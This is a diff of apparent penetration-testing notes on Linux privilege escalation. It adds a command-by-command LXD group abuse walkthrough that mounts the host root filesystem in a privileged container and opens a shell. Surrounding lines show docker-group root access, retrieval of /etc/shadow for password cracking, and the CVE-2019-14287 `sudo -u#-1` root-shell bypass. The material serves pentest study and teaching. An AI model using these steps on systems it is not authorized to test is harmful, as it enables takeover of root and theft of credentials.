@@ -641,7 +641,7 @@ gcc -fPIC -shared src.c -o /development/libshared.so
 
 Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.
 
-```
+```bash
 secaudit@NIX02:~$ id
 
 uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
@@ -655,7 +655,78 @@ Users within the disk group have full access to any devices contained within `/d
 
 Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.
 
-<br>
+### LXD Group Abuse
+
+#### 1. Check if you're part of LXD group&#x20;
+
+{% code overflow="wrap" %}
+```bash
+id
+groups
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1869).png" alt=""><figcaption></figcaption></figure>
+
+#### 2. Copy the alpine image from the remote&#x20;
+
+{% code overflow="wrap" %}
+```bash
+lxc image copy images:alpine/3.21 local: --alias alpine
+lxc image list images: alpine
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1865).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+_If you don't have internet then you can use the image available below for importing using below command_&#x20;
+
+{% code overflow="wrap" %}
+```bash
+lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+```
+{% endcode %}
+{% endhint %}
+
+{% file src="../../.gitbook/assets/alpine.tar.gz" %}
+
+#### 3. Create a privileged container&#x20;
+
+{% code overflow="wrap" %}
+```bash
+lxc init alpine privesc -c security.privileged=true
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1866).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+_Note that here `privesc` is the name of our container._&#x20;
+{% endhint %}
+
+#### 4. Mount the host filesystem&#x20;
+
+{% code overflow="wrap" %}
+```bash
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1867).png" alt=""><figcaption></figcaption></figure>
+
+#### 5. Start the container and get shell
+
+{% code overflow="wrap" %}
+```bash
+lxc start privesc
+lxc exec privesc /bin/sh
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1868).png" alt=""><figcaption></figcaption></figure>
+
+> _From here you know what you've to do. Note that The `/` of the system will be loaded at `/mnt/root` of the container._&#x20;
 
 ## Critical Sudo Vulnerability (CVE-2019-14287)
 
@@ -668,10 +739,6 @@ sudo -u#-1 /bin/bash
 ```
 
 On a vulnerable system with a rule such as `(ALL, !root)`, the `-1` UID is interpreted as `0` (root), resulting in a root shell.
-
-
-
-
 
 ## Using Automated tools
 
